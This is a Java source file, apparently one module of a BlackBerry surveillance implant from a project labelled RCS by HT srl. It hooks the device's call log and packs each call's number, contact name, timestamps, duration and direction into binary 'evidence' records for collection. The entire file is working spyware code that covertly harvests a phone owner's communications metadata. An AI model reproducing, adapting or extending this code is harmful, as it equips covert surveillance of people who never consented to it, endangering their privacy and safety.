//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallListAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.module;

import java.util.Date;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.Messages;
import blackberry.config.ConfModule;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.interfaces.CallListObserver;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;

/**
 * The Class CallListAgent.
 */
public final class ModuleCallList extends BaseModule implements
        CallListObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ModCallList", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    //13.0=calllist
    public static String getStaticType() {
        return Messages.getString("13.0"); //$NON-NLS-1$
    }

    private static boolean listening = false;

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart"); //$NON-NLS-1$
        //#endif

        //#ifdef DBC
        Check.requires(listening == false, "actualStart: already listening"); //$NON-NLS-1$
        //#endif

        AppListener.getInstance().addCallListObserver(this);
        listening = true;
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop"); //$NON-NLS-1$
        //#endif
        AppListener.getInstance().removeCallListObserver(this);
        listening = false;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualLoop() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(ConfModule conf) {

        return true;
    }

    public void callLogAdded(String number, String name, Date date,
            int duration, boolean outgoing, boolean missed) {
        //#ifdef DEBUG
        debug.info("number: " + number + " date: " + date + " duration: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
                + duration + " outgoing: " + outgoing + " missed: " + missed); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        final String nametype = "u"; //$NON-NLS-1$
        final String note = "no notes"; //$NON-NLS-1$

        //#ifdef DBC
        Check.requires(number != null, "callLogAdded null number"); //$NON-NLS-1$
        Check.requires(name != null, "callLogAdded null name"); //$NON-NLS-1$
        Check.requires(nametype != null, "callLogAdded null nametype"); //$NON-NLS-1$
        Check.requires(note != null, "callLogAdded null note"); //$NON-NLS-1$
        //#endif

        final int LOG_CALLIST_VERSION = 0;

        int len = 28; //0x1C;

        len += wsize(number);
        len += wsize(name);
        len += wsize(note);
        len += wsize(nametype);

        final byte[] data = new byte[len];

        final DataBuffer databuffer = new DataBuffer(data, 0, len, false);

        final DateTime from = new DateTime(date);
        final DateTime to = new DateTime(new Date(date.getTime() + duration
                * 1000));

        databuffer.writeInt(len);
        databuffer.writeInt(LOG_CALLIST_VERSION);
        databuffer.writeLong(from.getFiledate());
        databuffer.writeLong(to.getFiledate());

        final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
        databuffer.writeInt(flags);

        //#ifdef DBC
        Check.asserts(databuffer.getLength() == len,
                "callLogAdded: wrong len: " + databuffer.getLength()); //$NON-NLS-1$
        //#endif

        Utils.addTypedString(databuffer, (byte) 0x01, name);
        Utils.addTypedString(databuffer, (byte) 0x02, nametype);
        Utils.addTypedString(databuffer, (byte) 0x04, note);
        Utils.addTypedString(databuffer, (byte) 0x08, number);

        Evidence evidence = new Evidence(EvidenceType.CALLLIST);
        evidence.atomicWriteOnce(getAdditionalData(), databuffer.getArray());

    }

    private int wsize(String string) {
        if (string.length() == 0) {
            return 0;
        } else {
            return string.length() * 2 + 4;
        }
    }

    private byte[] getAdditionalData() {
        return null;
    }

}
